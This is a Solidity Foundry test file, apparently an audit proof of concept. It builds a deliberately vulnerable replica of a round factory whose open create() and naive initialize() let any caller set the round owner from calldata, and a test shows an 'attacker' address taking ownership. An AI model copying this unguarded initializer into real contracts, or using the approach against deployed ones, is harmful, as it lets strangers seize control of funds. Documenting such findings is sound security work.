// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";

// Minimal vulnerable replica
contract RoundImplementation {
    address public roundOwner;
    address public settings;

    function initialize(bytes calldata encodedParameters, address alloSettings) external {
        // naive initialize that trusts calldata to set owner
        roundOwner = abi.decode(encodedParameters, (address));
        settings = alloSettings;
    }
}

contract RoundFactory {
    address public owner;
    address public roundImplementation;
    address public alloSettings;

    event RoundCreated(address indexed roundAddress, address indexed ownedBy, address indexed roundImplementation);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    function updateRoundImplementation(address newRoundImplementation) external onlyOwner {
        roundImplementation = newRoundImplementation;
    }

    function updateAlloSettings(address newAlloSettings) external onlyOwner {
        alloSettings = newAlloSettings;
    }

    // Vulnerable: anyone can call create()
    function create(bytes calldata encodedParameters, address ownedBy) external returns (address) {
        require(roundImplementation != address(0), "roundImplementation is 0x");
        require(alloSettings != address(0), "alloSettings is 0x");

        // instead of cloning, just deploy a new instance for PoC
        address clone = address(new RoundImplementation());

        emit RoundCreated(clone, ownedBy, roundImplementation);

        RoundImplementation(payable(clone)).initialize(encodedParameters, alloSettings);

        return clone;
    }
}

contract RoundFactoryTest is Test {
    RoundFactory target;
    RoundImplementation impl;
    address attacker;

    function setUp() public {
        target = new RoundFactory();
        impl = new RoundImplementation();
        attacker = makeAddr("attacker");

        // factory owner (this contract) sets implementation and settings
        target.updateRoundImplementation(address(impl));
        target.updateAlloSettings(address(0xBEEF));
    }

    function test_attacker_exploits_create() public {
        // Attacker calls create and passes encodedParameters that set themselves as round owner
        vm.prank(attacker);
        address round = target.create(abi.encode(attacker), attacker);

        // attacker becomes owner of the newly initialized round
        assertEq(RoundImplementation(round).roundOwner(), attacker);
    }
}

